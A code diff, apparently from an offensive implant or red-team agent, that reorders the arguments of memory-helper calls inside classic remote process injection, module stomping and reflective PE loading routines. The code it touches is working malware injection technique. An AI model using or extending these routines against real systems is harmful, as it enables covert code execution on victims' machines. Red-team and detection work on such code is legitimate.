@@ -48,22 +48,22 @@ auto DECLFN Injection::Classic(
         PsHandle = Self->Ps->Open( PROCESS_ALL_ACCESS, FALSE, ProcessID );
     }
 
-    BaseRet = Self->Mm->Alloc( PsHandle, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    BaseRet = Self->Mm->Alloc( nullptr, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, PsHandle );
 
     if ( PsHandle != INVALID_HANDLE_VALUE ) {
-        Success = Self->Mm->Write( PsHandle, BaseRet, Buffer, Size );
+        Success = Self->Mm->Write( BaseRet, Buffer, Size, PsHandle );
         if ( !Success ) goto _KH_END;
     } else {
         Mem::Copy( BaseRet, Buffer, Size );
     }
 
-    Success = Self->Mm->Protect( PsHandle, BaseRet, Size, PAGE_EXECUTE_READ, &OldProt );
+    Success = Self->Mm->Protect( BaseRet, Size, PAGE_EXECUTE_READ, &OldProt, PsHandle );
     if ( !Success ) goto _KH_END;
 
     Self->Td->Create( PsHandle, BaseRet, Param, 0, 0, 0 );
 _KH_END:
     if ( !Success && BaseRet ) {
-        Self->Mm->Free( PsHandle, BaseRet, Size, MEM_RELEASE );
+        Self->Mm->Free( BaseRet, Size, MEM_RELEASE, PsHandle );
     } else {
         *Base = BaseRet;
     }
@@ -171,7 +171,7 @@ auto DECLFN Injection::Stomp(
     NtStatus = Self->Mm->MapView( SecHandle, NtCurrentProcess(), &LibPtr, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE );
     if ( NtStatus != STATUS_SUCCESS ) return FALSE;
 
-    if ( !Self->Mm->Protect( PsHandle, (PVOID)( U_PTR( LibPtr ) + TextVirt ), TextSize, PAGE_READWRITE, &OldProt ) ) return FALSE;
+    if ( !Self->Mm->Protect( (PVOID)( U_PTR( LibPtr ) + TextVirt ), TextSize, PAGE_READWRITE, &OldProt, PsHandle ) ) return FALSE;
     
     Mem::Copy( (PVOID)( U_PTR( LibPtr ) + TextVirt ), Buffer, Size );
 
@@ -222,7 +222,7 @@ auto DECLFN Injection::Reflection(
     KhDbg( "parsed pe" );
     KhDbg( "is %s", IsDll ? "DLL" : "EXE" );
 
-    ImgBase = (BYTE*)Self->Mm->Alloc( nullptr, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, 0x40 );
+    ImgBase = (BYTE*)Self->Mm->Alloc( nullptr, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     Delta   = U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase;
 
     KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );
@@ -274,7 +274,7 @@ auto DECLFN Injection::Reflection(
 		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
 			MemoryProtection = PAGE_EXECUTE_READWRITE;
 
-        if ( !( Self->Mm->Protect( NtCurrentProcess(), SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
+        if ( !( Self->Mm->Protect( SectionPtr, SectionSize, MemoryProtection, &OldProtection, NtCurrentProcess() ) ) ) { return FALSE; }
     }
 
     KhDbg( "fixed sections memory protections" );
@@ -324,7 +324,7 @@ auto DECLFN Injection::Reflection(
 
 _KH_END:
     if ( ImgBase ) {
-        Self->Mm->Free( NULL, ImgBase, Size, MEM_RELEASE );
+        Self->Mm->Free( ImgBase, Size, MEM_RELEASE );
     }
 
     if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
